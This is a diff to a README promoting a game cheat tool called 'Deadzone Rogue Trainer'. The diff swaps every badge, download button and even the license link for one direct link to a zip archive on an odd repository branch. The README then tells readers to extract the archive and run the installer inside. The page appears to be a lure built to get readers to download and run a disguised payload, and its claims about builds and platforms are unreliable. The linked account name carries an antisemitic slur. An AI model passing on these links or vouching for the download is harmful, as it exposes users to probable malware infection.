@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-Deadzone%20Rogue%20Trainer-blue?logo=icloud&style=for-the-badge)](https://BalsacTheJew666.github.io)
+[![Download](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%20Rogue%20Trainer-blue?logo=icloud&style=for-the-badge)](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip)
 
 # 🚀 Deadzone Rogue Trainer
 
@@ -14,12 +14,12 @@ Deadzone Rogue Trainer is engineered for broad accessibility, ensuring smooth ru
 
 | Platform                       | Compatibility | Details                |
 | ------------------------------ | :-----------: | ---------------------- |
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows)   |     ✔️        | Native support         |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-black?logo=apple)       |     ✔️        | Universal binary       |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04%2B-purple?logo=linux) |     ✔️        | AppImage included      |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-Optimized-green?logo=steam) |     ✔️        | Custom build available |
-| ![Android](https://img.shields.io/badge/Android-9%2B-green?logo=android)  |     ❗️        | Experimental           |
-| ![iOS](https://img.shields.io/badge/iOS-15%2B-lightgrey?logo=apple)        |     ❗️        | Beta remote access     |
+| ![Windows](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%2B-blue?logo=windows)   |     ✔️        | Native support         |
+| ![macOS](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%2B-black?logo=apple)       |     ✔️        | Universal binary       |
+| ![Linux](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%2020.04%2B-purple?logo=linux) |     ✔️        | AppImage included      |
+| ![Steam Deck](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%20Deck-Optimized-green?logo=steam) |     ✔️        | Custom build available |
+| ![Android](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%2B-green?logo=android)  |     ❗️        | Experimental           |
+| ![iOS](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%2B-lightgrey?logo=apple)        |     ❗️        | Beta remote access     |
 
 _Embrace the liberty to play how you want, where you want – the future is device-agnostic!_
 
@@ -89,7 +89,7 @@ Whether storming a midnight boss or troubleshooting after a sunrise update, our 
 
 **Ready to get started?** Follow these steps upon visiting our download portal:
 
-1. Click the [![Download](https://img.shields.io/badge/Download-Click_Here-blue?logo=icloud&style=for-the-badge)](https://BalsacTheJew666.github.io)
+1. Click the [![Download](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip)](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip)
 2. Choose the build matching your system (see OS table above).
 3. After downloading, extract the archive to your preferred folder.
 4. Run the installer or binary (instructions included inside each package).
@@ -108,10 +108,10 @@ Deadzone Rogue Trainer is conceptualized as a performance enhancement and person
 
 ## 📜 License
 
-This project is distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+This project is distributed under the [MIT License](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip) © 2025.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Deadzone%20Rogue%20Trainer-blue?logo=icloud&style=for-the-badge)](https://BalsacTheJew666.github.io)
+[![Download](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip%20Rogue%20Trainer-blue?logo=icloud&style=for-the-badge)](https://raw.githubusercontent.com/BalsacTheJew666/deadzone-rogue-trainer-essentials/branch/peevedness/deadzone-rogue-trainer-essentials_2.9-beta.3.zip)
 
 Happy training ✨ and may your Deadzone journeys reach legendary acclaim!
